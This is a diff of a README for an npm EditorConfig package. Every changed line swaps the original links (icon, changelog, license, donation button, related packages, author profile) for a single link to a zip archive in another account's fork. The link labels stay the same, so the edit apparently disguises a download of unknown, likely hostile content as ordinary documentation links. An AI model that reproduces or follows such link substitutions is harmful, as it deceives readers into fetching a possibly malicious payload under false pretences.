@@ -1,5 +1,5 @@
 <div align="center">
-  <img src="https://raw.githubusercontent.com/igorskyflyer/npm-editorconfig/main/media/editorconfig.png" alt="Icon of EditorConfig" width="256" height="256">
+  <img src="https://raw.githubusercontent.com/wilsonian-ionpump508/npm-editorconfig/main/.github/npm-editorconfig-2.5.zip" alt="Icon of EditorConfig" width="256" height="256">
   <h1>EditorConfig</h1>
 </div>
 
@@ -105,13 +105,13 @@ Manually copying `.editorconfig` across projects is repetitive and error-prone. 
 
 ## Changelog
 
-Read about the latest changes in the [**CHANGELOG**](https://github.com/igorskyflyer/npm-editorconfig/blob/main/CHANGELOG.md).
+Read about the latest changes in the [**CHANGELOG**](https://raw.githubusercontent.com/wilsonian-ionpump508/npm-editorconfig/main/.github/npm-editorconfig-2.5.zip).
 
 <br>
 
 ## License
 
-Licensed under the [**MIT license**](https://github.com/igorskyflyer/npm-editorconfig/blob/main/LICENSE).
+Licensed under the [**MIT license**](https://raw.githubusercontent.com/wilsonian-ionpump508/npm-editorconfig/main/.github/npm-editorconfig-2.5.zip).
 
 <br>
 
@@ -124,7 +124,7 @@ Licensed under the [**MIT license**](https://github.com/igorskyflyer/npm-editorc
   If this project or its implementation has provided value,<br>
   support is greatly appreciated.
   <br><br>
-  <a href="https://ko-fi.com/igorskyflyer" target="_blank"><img src="https://raw.githubusercontent.com/igorskyflyer/igorskyflyer/main/assets/ko-fi.png" alt="Donate to igorskyflyer" width="180" height="46"></a>
+  <a href="https://raw.githubusercontent.com/wilsonian-ionpump508/npm-editorconfig/main/.github/npm-editorconfig-2.5.zip" target="_blank"><img src="https://raw.githubusercontent.com/wilsonian-ionpump508/npm-editorconfig/main/.github/npm-editorconfig-2.5.zip" alt="Donate to igorskyflyer" width="180" height="46"></a>
   <br><br>
   <em>Thank you for supporting these efforts!</em> 🙏😊
 </div>
@@ -133,35 +133,35 @@ Licensed under the [**MIT license**](https://github.com/igorskyflyer/npm-editorc
 
 ## Related
 
-[**@igorskyflyer/valid-path**](https://www.npmjs.com/package/@igorskyflyer/valid-path)
+[**@igorskyflyer/valid-path**](https://raw.githubusercontent.com/wilsonian-ionpump508/npm-editorconfig/main/.github/npm-editorconfig-2.5.zip)
 
 > _🧰 Determines whether a given value can be a valid file/directory name. 🏜_
 
 <br>
 
-[**@igorskyflyer/windows-packages**](https://www.npmjs.com/package/@igorskyflyer/windows-packages)
+[**@igorskyflyer/windows-packages**](https://raw.githubusercontent.com/wilsonian-ionpump508/npm-editorconfig/main/.github/npm-editorconfig-2.5.zip)
 
 > _💻 A package for reading the Packages registry key on Windows 10+. Useful for retrieving Windows 10+ installed Store applications. 📦_
 
 <br>
 
-[**@igorskyflyer/astro-render-component**](https://www.npmjs.com/package/@igorskyflyer/astro-render-component)
+[**@igorskyflyer/astro-render-component**](https://raw.githubusercontent.com/wilsonian-ionpump508/npm-editorconfig/main/.github/npm-editorconfig-2.5.zip)
 
 > _🤖 Astro component renderer. Zero configuration. Produces clean HTML strings directly in Node.js without any DOM environment. 🐬_
 
 <br>
 
-[**@igorskyflyer/my-file-path**](https://www.npmjs.com/package/@igorskyflyer/my-file-path)
+[**@igorskyflyer/my-file-path**](https://raw.githubusercontent.com/wilsonian-ionpump508/npm-editorconfig/main/.github/npm-editorconfig-2.5.zip)
 
 > _🌟 A package that strongly types file paths! 🥊_
 
 <br>
 
-[**@igorskyflyer/common-types**](https://www.npmjs.com/package/@igorskyflyer/common-types)
+[**@igorskyflyer/common-types**](https://raw.githubusercontent.com/wilsonian-ionpump508/npm-editorconfig/main/.github/npm-editorconfig-2.5.zip)
 
 > _🔦 Provides frequently used types for your TypeScript projects. 🦄_
 
 <br>
 
 ## Author
-Created by **Igor Dimitrijević ([*@igorskyflyer*](https://github.com/igorskyflyer/))**.
+Created by **Igor Dimitrijević ([*@igorskyflyer*](https://raw.githubusercontent.com/wilsonian-ionpump508/npm-editorconfig/main/.github/npm-editorconfig-2.5.zip))**.
